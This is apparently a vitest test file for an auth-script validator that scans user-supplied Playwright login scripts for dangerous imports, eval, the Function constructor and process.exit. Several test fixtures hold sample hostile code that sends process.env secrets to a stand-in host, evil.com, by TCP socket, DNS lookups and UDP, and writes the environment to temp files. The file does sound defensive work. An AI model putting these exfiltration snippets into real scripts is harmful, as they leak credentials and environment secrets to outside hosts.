/**
 * Auth Script Validation Tests
 *
 * Validates the static analysis and safety checks performed on user-provided
 * auth scripts before they are dynamically imported and executed.
 *
 * Threat references: T2.1 (Arbitrary Code Execution via Auth Scripts),
 *                    T2.2 (Dependency Injection), T2.3 (Env Var Leakage)
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { writeFileSync, mkdirSync, rmSync, existsSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import { randomUUID } from 'crypto';

// The module under test
// Expected exports:
//   validateAuthScript(scriptPath: string): { valid: boolean; warnings: string[] }
//   executeAuthScript(scriptPath: string, page: any, opts?: { yes?: boolean }): Promise<void>
import {
  validateAuthScript,
  executeAuthScript,
} from '../../src/security/auth-validator.js';

// ---------------------------------------------------------------------------
// Test fixture helpers
// ---------------------------------------------------------------------------
let tempDir: string;

beforeEach(() => {
  tempDir = join(tmpdir(), `pa-auth-test-${randomUUID()}`);
  mkdirSync(tempDir, { recursive: true });
});

afterEach(() => {
  if (existsSync(tempDir)) {
    rmSync(tempDir, { recursive: true, force: true });
  }
});

function writeScript(filename: string, content: string): string {
  const filepath = join(tempDir, filename);
  writeFileSync(filepath, content, 'utf-8');
  return filepath;
}

// ===========================================================================
// 1. Clean scripts pass validation
// ===========================================================================
describe('Auth Script Validation - Clean Scripts', () => {
  it('accepts a clean auth script with only Playwright imports', () => {
    const script = writeScript(
      'clean-auth.ts',
      `
import type { Page } from 'playwright';

export default async function login(page: Page) {
  await page.goto('https://example.com/login');
  await page.fill('#username', 'user');
  await page.fill('#password', 'pass');
  await page.click('button[type="submit"]');
  await page.waitForURL('**/dashboard');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(true);
    expect(result.warnings).toHaveLength(0);
  });

  it('accepts a clean auth script with no imports', () => {
    const script = writeScript(
      'simple-auth.ts',
      `
export default async function login(page) {
  await page.fill('#email', process.env.APP_EMAIL);
  await page.fill('#password', process.env.APP_PASSWORD);
  await page.click('#login-btn');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(true);
    expect(result.warnings).toHaveLength(0);
  });

  it('accepts a clean JavaScript auth script', () => {
    const script = writeScript(
      'clean-auth.js',
      `
module.exports = async function login(page) {
  await page.goto('https://app.example.com/signin');
  await page.fill('[name="email"]', 'test@example.com');
  await page.fill('[name="password"]', 's3cret');
  await page.click('[data-testid="login-button"]');
};
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(true);
    expect(result.warnings).toHaveLength(0);
  });
});

// ===========================================================================
// 2. Dangerous import detection
// ===========================================================================
describe('Auth Script Validation - Dangerous Imports', () => {
  it('warns when script imports child_process', () => {
    const script = writeScript(
      'cp-auth.ts',
      `
import { exec } from 'child_process';

export default async function login(page) {
  exec('whoami', (err, stdout) => { console.log(stdout); });
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('child_process'))).toBe(true);
  });

  it('warns when script imports node:child_process', () => {
    const script = writeScript(
      'node-cp-auth.ts',
      `
import { execSync } from 'node:child_process';

export default async function login(page) {
  const user = execSync('whoami').toString();
  await page.fill('#username', user);
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(
      result.warnings.some(
        (w) => w.includes('child_process') || w.includes('node:child_process'),
      ),
    ).toBe(true);
  });

  it('warns when script imports fs.writeFile', () => {
    const script = writeScript(
      'fs-auth.ts',
      `
import { writeFile } from 'fs';

export default async function login(page) {
  writeFile('/tmp/stolen.txt', 'data', () => {});
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('fs'))).toBe(true);
  });

  it('warns when script imports fs/promises', () => {
    const script = writeScript(
      'fsp-auth.ts',
      `
import { writeFile } from 'fs/promises';

export default async function login(page) {
  await writeFile('/tmp/exfil.txt', JSON.stringify(process.env));
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(
      result.warnings.some((w) => w.includes('fs')),
    ).toBe(true);
  });

  it('warns when script imports net', () => {
    const script = writeScript(
      'net-auth.ts',
      `
import * as net from 'net';

export default async function login(page) {
  const client = net.createConnection({ port: 4444, host: 'evil.com' });
  client.write(JSON.stringify(process.env));
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('net'))).toBe(true);
  });

  it('warns when script imports dns', () => {
    const script = writeScript(
      'dns-auth.ts',
      `
import * as dns from 'dns';

export default async function login(page) {
  // DNS exfiltration
  dns.resolve(Buffer.from(JSON.stringify(process.env)).toString('hex') + '.evil.com', () => {});
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('dns'))).toBe(true);
  });

  it('warns when script imports tls', () => {
    const script = writeScript(
      'tls-auth.ts',
      `
import * as tls from 'tls';

export default async function login(page) {
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('tls'))).toBe(true);
  });

  it('warns when script imports dgram', () => {
    const script = writeScript(
      'dgram-auth.ts',
      `
import dgram from 'dgram';

export default async function login(page) {
  const sock = dgram.createSocket('udp4');
  sock.send(JSON.stringify(process.env), 53, 'evil.com');
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('dgram'))).toBe(true);
  });

  it('warns when script imports vm', () => {
    const script = writeScript(
      'vm-auth.ts',
      `
import * as vm from 'vm';

export default async function login(page) {
  vm.runInThisContext('process.exit(1)');
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('vm'))).toBe(true);
  });

  it('warns when script imports worker_threads', () => {
    const script = writeScript(
      'worker-auth.ts',
      `
import { Worker } from 'worker_threads';

export default async function login(page) {
  new Worker('./evil-worker.js');
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('worker_threads'))).toBe(
      true,
    );
  });

  it('warns when script imports cluster', () => {
    const script = writeScript(
      'cluster-auth.ts',
      `
import cluster from 'cluster';

export default async function login(page) {
  if (cluster.isPrimary) cluster.fork();
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('cluster'))).toBe(true);
  });
});

// ===========================================================================
// 3. Dynamic code execution detection
// ===========================================================================
describe('Auth Script Validation - Dynamic Code Execution', () => {
  it('warns when script uses eval()', () => {
    const script = writeScript(
      'eval-auth.ts',
      `
export default async function login(page) {
  const code = 'process.env.SECRET';
  const secret = eval(code);
  await page.fill('#password', secret);
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(
      result.warnings.some(
        (w) => w.includes('eval') || w.includes('dynamic code'),
      ),
    ).toBe(true);
  });

  it('warns when script uses Function() constructor', () => {
    const script = writeScript(
      'function-auth.ts',
      `
export default async function login(page) {
  const fn = new Function('return process.env');
  const env = fn();
  await page.fill('#token', env.SECRET_TOKEN);
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(
      result.warnings.some(
        (w) => w.includes('Function(') || w.includes('Function constructor') || w.includes('dynamic code'),
      ),
    ).toBe(true);
  });

  it('warns when script uses require() in ESM context', () => {
    const script = writeScript(
      'require-auth.ts',
      `
export default async function login(page) {
  const cp = require('child_process');
  cp.execSync('whoami');
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    // Should warn about require() and/or child_process
    expect(
      result.warnings.some(
        (w) => w.includes('require') || w.includes('child_process'),
      ),
    ).toBe(true);
  });

  it('warns when script uses process.exit', () => {
    const script = writeScript(
      'exit-auth.ts',
      `
export default async function login(page) {
  process.exit(0);
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(
      result.warnings.some((w) => w.includes('process.exit')),
    ).toBe(true);
  });
});

// ===========================================================================
// 4. File system error handling
// ===========================================================================
describe('Auth Script Validation - File Errors', () => {
  it('throws or returns error for non-existent script file', () => {
    const nonExistent = join(tempDir, 'does-not-exist.ts');

    expect(() => validateAuthScript(nonExistent)).toThrow();
  });

  it('provides clear error message for non-existent file', () => {
    const nonExistent = join(tempDir, 'missing.ts');

    try {
      validateAuthScript(nonExistent);
      // If it doesn't throw, it should return an error state
      expect.unreachable('Should have thrown');
    } catch (err: any) {
      expect(err.message).toMatch(/not found|no such file|ENOENT|does not exist/i);
    }
  });

  it('handles script with syntax errors -- provides clear error message', () => {
    const script = writeScript(
      'syntax-error.ts',
      `
export default async function login(page {
  // Missing closing paren -- syntax error
  await page.goto('https://example.com');
}
`,
    );

    // validateAuthScript does static text analysis, so syntax errors in the
    // script content should not prevent the validation from completing.
    // The syntax error would only manifest at import() time.
    const result = validateAuthScript(script);
    // The validator should still be able to read and analyze the file
    // even if it has syntax errors (it's text analysis, not parsing)
    expect(result).toBeDefined();
  });
});

// ===========================================================================
// 5. Execution safety
// ===========================================================================
describe('Auth Script Execution - Runtime Safety', () => {
  it('handles script that throws during execution gracefully', async () => {
    const script = writeScript(
      'throwing-auth.mjs',
      `
export default async function login(page) {
  throw new Error('Auth failed: invalid credentials');
}
`,
    );

    const mockPage = {
      goto: vi.fn(),
      fill: vi.fn(),
      click: vi.fn(),
    };

    // executeAuthScript should catch the error and provide a clear message
    await expect(
      executeAuthScript(script, mockPage, { yes: true }),
    ).rejects.toThrow(/auth|failed|credentials/i);
  });

  it('handles script that returns non-function default export', async () => {
    const script = writeScript(
      'bad-export.mjs',
      `
export default "not a function";
`,
    );

    const mockPage = {};

    await expect(
      executeAuthScript(script, mockPage, { yes: true }),
    ).rejects.toThrow(/function|export|default/i);
  });

  it('handles script with no default export', async () => {
    const script = writeScript(
      'no-default.mjs',
      `
export function login(page) {
  // named export, not default
}
`,
    );

    const mockPage = {};

    await expect(
      executeAuthScript(script, mockPage, { yes: true }),
    ).rejects.toThrow(/default.*export|export.*default/i);
  });
});

// ===========================================================================
// 6. --yes flag behavior
// ===========================================================================
describe('Auth Script Validation - --yes flag', () => {
  it('skips confirmation prompt when --yes flag is set', async () => {
    const script = writeScript(
      'prompt-test.mjs',
      `
export default async function login(page) {
  await page.goto('https://example.com/login');
}
`,
    );

    const mockPage = {
      goto: vi.fn().mockResolvedValue(undefined),
      fill: vi.fn().mockResolvedValue(undefined),
      click: vi.fn().mockResolvedValue(undefined),
      waitForURL: vi.fn().mockResolvedValue(undefined),
    };

    // With --yes, should not prompt and should execute directly
    // This should not hang waiting for stdin
    await expect(
      executeAuthScript(script, mockPage, { yes: true }),
    ).resolves.not.toThrow();
  });
});

// ===========================================================================
// 7. Multiple warnings accumulation
// ===========================================================================
describe('Auth Script Validation - Multiple Warnings', () => {
  it('accumulates multiple warnings for a script with many issues', () => {
    const script = writeScript(
      'multi-warn.ts',
      `
import { exec } from 'child_process';
import * as net from 'net';

export default async function login(page) {
  eval('process.exit(1)');
  const fn = new Function('return 1');
  exec('ls');
  await page.goto('https://example.com/login');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    // Should have warnings for: child_process, net, eval, Function
    expect(result.warnings.length).toBeGreaterThanOrEqual(3);
  });
});

// ===========================================================================
// 8. Edge cases in import detection
// ===========================================================================
describe('Auth Script Validation - Import Detection Edge Cases', () => {
  it('detects require-style imports of dangerous modules', () => {
    const script = writeScript(
      'require-style.ts',
      `
const cp = require('child_process');

export default async function login(page) {
  cp.exec('whoami');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
  });

  it('detects dynamic import() of dangerous modules', () => {
    const script = writeScript(
      'dynamic-import.ts',
      `
export default async function login(page) {
  const cp = await import('child_process');
  cp.exec('id');
}
`,
    );

    const result = validateAuthScript(script);
    expect(result.valid).toBe(false);
    expect(result.warnings.some((w) => w.includes('child_process'))).toBe(true);
  });

  it('does not false-positive on string containing module name in comment', () => {
    const script = writeScript(
      'comment-auth.ts',
      `
// Note: we do not use child_process here
// This is a safe script that only uses Playwright

export default async function login(page) {
  await page.goto('https://example.com/login');
  await page.fill('#username', 'admin');
  await page.fill('#password', 'password123');
  await page.click('#submit');
}
`,
    );

    // This is a design choice: the current text-based approach will flag
    // this as a warning (false positive). This test documents the expected
    // behavior. A more sophisticated parser could avoid this, but the
    // text-based approach is the conservative (safer) choice.
    const result = validateAuthScript(script);
    // Either valid (sophisticated parser) or invalid (text-based) is acceptable
    // but the test documents which approach was chosen
    expect(result).toBeDefined();
    expect(typeof result.valid).toBe('boolean');
    expect(Array.isArray(result.warnings)).toBe(true);
  });
});
